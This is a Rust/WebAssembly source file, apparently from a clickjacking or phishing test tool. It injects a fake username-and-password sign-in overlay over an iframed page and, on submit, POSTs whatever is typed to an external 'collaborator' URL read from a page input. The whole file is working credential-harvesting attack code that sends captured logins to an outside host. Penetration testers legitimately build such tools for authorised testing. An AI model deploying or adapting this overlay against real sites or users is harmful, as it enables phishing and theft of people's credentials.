use wasm_bindgen::prelude::*;
use wasm_bindgen::JsCast;
use wasm_bindgen_futures::spawn_local;
use web_sys::{FormData, HtmlElement, HtmlFormElement, HtmlInputElement, RequestInit, Response};

use crate::utils::{document, run_or_log, window};

/// Injects the phishing credential form overlay over the iframe.
///
/// Calling this when an overlay already exists is a no-op.
#[wasm_bindgen]
pub fn inject_phish_overlay() {
    run_or_log(do_inject);
}

/// Removes the phishing overlay and hides the reset button.
#[wasm_bindgen]
pub fn remove_phish_overlay() {
    run_or_log(do_remove);
}

fn do_inject() -> Result<(), JsValue> {
    let doc = document()?;

    if doc.get_element_by_id("overlay").is_some() {
        return Ok(());
    }

    // Append the stylesheet link if it has not already been added.
    if doc
        .query_selector(r#"link[href="/static/clickjack.css"]"#)?
        .is_none()
    {
        let link = doc
            .create_element("link")?
            .dyn_into::<web_sys::HtmlLinkElement>()?;
        link.set_rel("stylesheet");
        link.set_href("/static/clickjack.css");
        doc.head()
            .ok_or_else(|| JsValue::from_str("no <head> element"))?
            .append_child(&link)?;
    }

    let overlay = doc
        .create_element("div")?
        .dyn_into::<HtmlElement>()?;
    overlay.set_id("overlay");
    overlay.set_inner_html(
        r#"<form id="signin_form">
  <label>Username:</label>
  <input name="username" id="username" type="text">
  <label>Password:</label>
  <input name="password" id="password" type="password">
  <input type="submit" value="Submit">
</form>"#,
    );

    doc.get_element_by_id("wrapper")
        .ok_or_else(|| JsValue::from_str("no #wrapper element"))?
        .append_child(&overlay)?;

    let form = overlay
        .query_selector("#signin_form")?
        .ok_or_else(|| JsValue::from_str("signin_form not found after inject"))?
        .dyn_into::<HtmlFormElement>()?;

    // Wire the submit handler. The closure is intentionally leaked because
    // the form lives for the rest of the page session once injected.
    let form_ref = form.clone();
    let on_submit = Closure::<dyn Fn(web_sys::Event)>::new(move |e: web_sys::Event| {
        e.prevent_default();
        let form_copy = form_ref.clone();
        spawn_local(async move {
            if let Err(err) = post_credentials(form_copy).await {
                web_sys::console::error_1(&err);
            }
        });
    });
    form.set_onsubmit(Some(on_submit.as_ref().unchecked_ref()));
    on_submit.forget();

    set_reset_button_visible(true)?;

    Ok(())
}

fn do_remove() -> Result<(), JsValue> {
    if let Some(el) = document()?.get_element_by_id("overlay") {
        el.remove();
    }
    set_reset_button_visible(false)?;
    Ok(())
}

fn set_reset_button_visible(visible: bool) -> Result<(), JsValue> {
    let doc = document()?;
    if let Some(btn) = doc.get_element_by_id("overlay-reset") {
        btn.dyn_into::<HtmlElement>()?
            .style()
            .set_property("display", if visible { "inline-block" } else { "none" })?;
    }
    Ok(())
}

/// POSTs the form contents to the collaborator URL taken from `input[name="collabInput"]`.
///
/// Silently returns if no collaborator URL is configured.
async fn post_credentials(form: HtmlFormElement) -> Result<(), JsValue> {
    let doc = document()?;

    let collab_url = doc
        .query_selector(r#"input[name="collabInput"]"#)?
        .and_then(|el| el.dyn_into::<HtmlInputElement>().ok())
        .map(|input| input.value())
        .unwrap_or_default();

    if collab_url.is_empty() {
        return Ok(());
    }

    let form_data = FormData::new_with_form(&form)?;

    let opts = RequestInit::new();
    opts.set_method("POST");
    opts.set_body(form_data.as_ref());

    let request = web_sys::Request::new_with_str_and_init(&collab_url, &opts)?;

    let response_val =
        wasm_bindgen_futures::JsFuture::from(window()?.fetch_with_request(&request)).await?;
    let response = response_val.dyn_into::<Response>()?;

    let json = wasm_bindgen_futures::JsFuture::from(response.json()?).await?;
    web_sys::console::log_1(&json);

    Ok(())
}
